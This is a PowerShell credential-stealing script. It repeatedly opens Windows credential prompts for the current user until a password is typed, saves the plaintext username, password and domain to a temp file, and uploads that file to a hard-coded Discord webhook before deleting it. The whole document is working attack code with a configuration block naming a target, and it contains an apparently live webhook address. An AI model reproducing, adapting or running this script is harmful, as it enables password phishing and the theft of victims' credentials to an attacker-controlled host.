# ============================================================================
# CONFIGURATION - USER MUST SET THESE
# ============================================================================
$db = "" # Dropbox Token
$dc = "https://discord.com/api/webhooks/1555582537982546041/GTSJgDiEC3p6LGeaveS4IxBmke3qAnGYJvljTd9j45tGxVfdjruvve_Nj_R_XwdxQipq" # Discord Hook
$env:username = "TargetUsername" # Username

# ============================================================================
# ASSEMBY &amp; UTILITIES
# ============================================================================

# Load the core library that contains the UI types
Add-Type -AssemblyName System.Windows.Forms

# Function to handle mandatory confirmation if the loop triggers manually
function Show-ErrorAlert {
    param(
        [string]$Title = "Error",
        [string]$Message = "Operation Failed."
    )
    # Use fully qualified type names directly, bypassing the complex assignments
    [System.Windows.MessageBox]::Show($Message, $Title, [System.Windows.MessageBoxButtons]::OK, [System.Windows.MessageBoxImage]::Stop)
}

# ============================================================================
# CORE LOGIC
# ============================================================================

function Get-Creds {
    while ($true) {
        $cred = $null

        # 1. Primary Attempt: Use the system's built-in prompt (most reliable fallback)
        try {
            # Note: Ensure $host.ui is defined if running in a non-standard console
            $cred = Get-Credential -UserName ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name); 
        }
        catch {
            # Fallback attempt
            Write-Warning "Get-Credential failed. Attempting host.ui..."
            try {
                 $cred = $host.ui.promptforcredential('Fallback Prompt','Please enter credentials.','Fallback','Fallback');
            } catch {
                Write-Error "All prompt mechanisms failed. Aborting."
                return $null
            }
        }

        # 2. Validation Check
        if (-not ($cred -and -not [string]::IsNullOrWhiteSpace($cred.Password))) {
            # --- TARGET POPUP ---
            $msgBody = "Credentials are empty. Please try again."
            # Triggering the error alert directly
            Show-ErrorAlert -Title "Input Required" -Message $msgBody
            # Loop continues to re-prompt
        }
        else {
            # Success path
            return $cred.GetNetworkCredential() | Select-Object Name, Password, Domain
        }
    }
}

function Upload-Discord {
    param ([string]$file)
    $hookurl = $dc

    if (-not $hookurl) {
        Write-Warning "Discord Webhook URL ($dc) is not set. Skipping Discord upload."
        return
    }

    $Body = @{
      'username' = $env:username
      'content' = "STATUS: Script Executed successfully via GUI prompt."
    }

    # 1. Send Text Payload
    try {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json) -ErrorAction Stop
        Write-Host "[SUCCESS] Text notification sent to Discord."
    }
    catch {
        Write-Error "[ERROR] Failed to send Discord text payload: $($_.Exception.Message)"
    }

    # 2. Send File Payload
    if (-not [string]::IsNullOrWhiteSpace($file) -and (Test-Path $file)) {
        try {
            Write-Host "[INFO] Uploading file to Discord..."
            curl.exe -F "file1=@$file" $hookurl
            Write-Host "[SUCCESS] File uploaded to Discord."
        }
        catch {
            Write-Error "[ERROR] Failed to upload file to Discord: $($_.Exception.Message)"
        }
    }
}

# ============================================================================
# MAIN EXECUTION BLOCK
# ============================================================================
try {
    # --- Initial VISUAL Cue (The first visible notification) ---
    Show-ErrorAlert -Title "SYSTEM BOOT" -Message "Script running. Awaiting credentials."

    # --- CORE INTERACTION ---
    $creds = Get-Creds

    # --- FILE &amp;amp; UPLOAD ---
    $FileName = "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Creds.txt"
    $tempPath = Join-Path $env:TEMP $FileName

    # Corrected File Output
    $creds | Out-File -FilePath $tempPath

    # Execute the main action
    Upload-Discord -file $tempPath

}
catch {
    # Catches all critical errors if the core block fails
    Show-ErrorAlert -Title "FATAL ERROR" -Message "Script encountered a critical failure: $($_.Exception.Message)"
}
finally {
    # Cleanup
    $tempFile = Join-Path $env:TEMP "$env:USERNAME-$(Get-Date -Format yyyy-MM-dd_HH-mm)_Creds.txt"
    if (Test-Path $tempFile) {
        Remove-Item $tempFile -Force
    }
    Write-Host "--- Execution Cycle Complete ---"
}
